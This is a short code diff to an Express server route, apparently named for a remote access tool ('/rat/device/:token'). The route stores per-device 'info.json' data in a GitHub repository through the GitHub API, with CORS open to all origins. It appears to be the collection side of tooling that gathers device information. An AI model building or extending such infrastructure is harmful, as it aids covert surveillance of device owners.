@@ -4,13 +4,14 @@
     const GITHUB_USER = 'daffaadev';
     const GITHUB_REPO = 'api';
 
-    app.get('/rat/device', async (req, res) => {
+    app.get('/rat/device/:token', async (req, res) => {
         res.setHeader('Access-Control-Allow-Origin', '*');
 
         try {
-            const { json, code } = req.query;
+            const { token } = req.params;
+            const { code } = req.query;
 
-            if (!json || !code) {
+            if (!token || !code) {
                 return res.status(400).json({
                     success: false,
                     message: 'Invalid parameters.'
@@ -27,16 +28,8 @@
                 });
             }
 
-            const token = parsedCode.token;
-            if (!token) {
-                return res.status(401).json({
-                    success: false,
-                    message: 'Invalid token.'
-                });
-            }
-
             const BASE_PATH = `device/${token}`;
-            const filePath = `${BASE_PATH}/${json}`;
+            const filePath = `${BASE_PATH}/info.json`;
 
             let fileExists = false;
             let currentSha = null;
@@ -69,7 +62,7 @@
             await axios.put(
                 `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                 {
-                    message: `Update ${json}`,
+                    message: `Update info.json for token ${token}`,
                     content: contentBase64,
                     sha: currentSha || undefined
                 },
